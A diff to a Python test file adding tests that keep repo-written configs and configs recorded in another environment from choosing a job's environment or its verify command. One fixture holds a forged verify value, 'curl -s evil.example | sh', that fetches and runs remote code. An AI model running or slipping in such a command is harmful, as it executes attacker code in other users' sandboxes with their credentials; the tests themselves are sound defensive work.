@@ -364,16 +364,47 @@ def test_checkout_script_quotes_and_defaults_to_the_remote_head():
 
 
 # ---------------------------------------------------------------------- jobs, MCP, REST
+def _seen(fl, env: str, url: str, text: str, at: float) -> None:
+    fl.store.kv_set(f"{KV_SEEN}{env}:{repo_key(url)}", Seen(
+        config=repoenv.parse(text).model_dump(mode="json"), at=at).model_dump_json())
+
+
 def test_job_defaults_take_extends_from_the_repo_file_when_allowed(fl, world):
     (world.envs / "other.yaml").write_text("name: other\n")
     fl.catalog.reload()
-    fl.store.kv_set(f"{KV_SEEN}appenv:{repo_key(world.url)}", Seen(
-        config=repoenv.parse("extends: other\nverify: make check\n").model_dump(mode="json")).model_dump_json())
-    cfg, env = envbuilds.job_defaults(fl, world.url, [])
+    _seen(fl, "appenv", world.url, "extends: other\nverify: make check\n", 1)
+    cfg, env = envbuilds.job_defaults(fl, world.url, ["appenv", "other"])
     assert env == "other" and cfg.verify == "make check"
     assert envbuilds.job_defaults(fl, world.url, ["appenv"])[1] is None  # the allowlist says no
     fl.settings.env_builds = False
-    assert envbuilds.job_defaults(fl, world.url, []) == (None, None)
+    assert envbuilds.job_defaults(fl, world.url, ["appenv", "other"]) == (None, None)
+
+
+def test_a_repo_without_an_allowlist_doesnt_pick_its_environment(fl, world):
+    """Review: the file is the repo's to write, and an environment carries credentials, secrets and egress. Only
+    HANGAR_GITHUB_REPOS (an admin) says which environments a repo may name; with no entry its `extends` is ignored."""
+    (world.envs / "other.yaml").write_text("name: other\n")
+    fl.catalog.reload()
+    _seen(fl, "appenv", world.url, "extends: other\nverify: make check\n", 1)
+    assert envbuilds.job_defaults(fl, world.url, [])[1] is None
+    cfg, env = envbuilds.job_defaults(fl, world.url, [], "appenv")  # the job named its environment
+    assert env is None and cfg.verify == "make check"
+
+
+def test_a_config_seen_in_another_environment_never_reaches_a_job(fl, world):
+    """Review: what a sandbox recorded about the repo is only as good as its environment: its `setup` and `install`
+    run before the read, and members make environments. A member's environment must not set the `verify` (a command
+    run in other people's job sandboxes, with their credentials) or the `extends` of jobs in another environment."""
+    (world.envs / "mine.yaml").write_text("name: mine\n")
+    fl.catalog.reload()
+    _seen(fl, "appenv", world.url, "verify: make check\n", 1)
+    _seen(fl, "mine", world.url, "extends: mine\nverify: curl -s evil.example | sh\n", 2)  # newer, and forged
+    cfg, env = envbuilds.job_defaults(fl, world.url, ["appenv"])
+    assert env is None and cfg.verify == "make check"
+    cfg, env = envbuilds.job_defaults(fl, world.url, [], "appenv")
+    assert env is None and cfg.verify == "make check"
+    assert envbuilds.job_config(fl, world.url, "appenv", None).verify == "make check"
+    assert envbuilds.job_config(fl, world.url, "other", None) is None
 
 
 def test_get_sandbox_shows_the_build():
